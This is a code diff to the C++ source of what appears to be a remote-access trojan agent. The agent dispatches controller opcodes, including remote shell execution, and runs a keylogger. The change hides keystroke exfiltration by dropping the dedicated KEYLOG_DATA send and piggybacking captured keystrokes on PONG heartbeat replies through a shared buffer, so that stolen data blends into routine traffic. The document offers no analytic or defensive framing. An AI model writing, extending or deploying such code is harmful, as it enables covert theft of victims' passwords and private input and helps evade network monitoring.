@@ -149,9 +149,16 @@ void Agent::handleDispatching(Packet&& packet) {
     } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
         handleShellExecution(std::move(packet));
     } else if (opcode == static_cast<uint16_t>(Opcode::PING)) {
-        // Piggyback any available keylog data on the PONG response
+        // Piggyback keylog data on PONG: prefer jittered data from shared buffer,
+        // fall back to immediate dump for any remaining keystrokes
         std::string pong_payload;
-        if (m_keylogger.isRunning()) {
+        {
+            std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
+            if (!m_keylog_pending_data.empty()) {
+                pong_payload = std::move(m_keylog_pending_data);
+            }
+        }
+        if (pong_payload.empty() && m_keylogger.isRunning()) {
             pong_payload = m_keylogger.dump();
         }
         Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
@@ -192,30 +199,11 @@ void Agent::handleKeylogStart() {
             std::string keystrokes = m_keylogger.dump();
             if (keystrokes.empty()) continue;
 
-            static uint32_t seq_num = 0;
-            seq_num++;
-
-            uint32_t timestamp = static_cast<uint32_t>(std::time(nullptr));
-            uint32_t data_len  = static_cast<uint32_t>(keystrokes.size());
-
-            std::vector<uint8_t> payload;
-            payload.reserve(12 + data_len);
-
-            auto writeBE32 = [&](uint32_t v) {
-                payload.push_back(static_cast<uint8_t>((v >> 24) & 0xFF));
-                payload.push_back(static_cast<uint8_t>((v >> 16) & 0xFF));
-                payload.push_back(static_cast<uint8_t>((v >> 8) & 0xFF));
-                payload.push_back(static_cast<uint8_t>(v & 0xFF));
-            };
-
-            writeBE32(seq_num);
-            writeBE32(timestamp);
-            writeBE32(data_len);
-            payload.insert(payload.end(), keystrokes.begin(), keystrokes.end());
-
-            Packet res(static_cast<uint16_t>(Opcode::KEYLOG_DATA),
-                       std::string(payload.begin(), payload.end()));
-            m_socket.sendData(res.serialize());
+            // Store in shared buffer for PONG piggybacking — no direct send
+            {
+                std::lock_guard<std::mutex> lock(m_keylog_pending_mutex);
+                m_keylog_pending_data = std::move(keystrokes);
+            }
         }
     });
 }
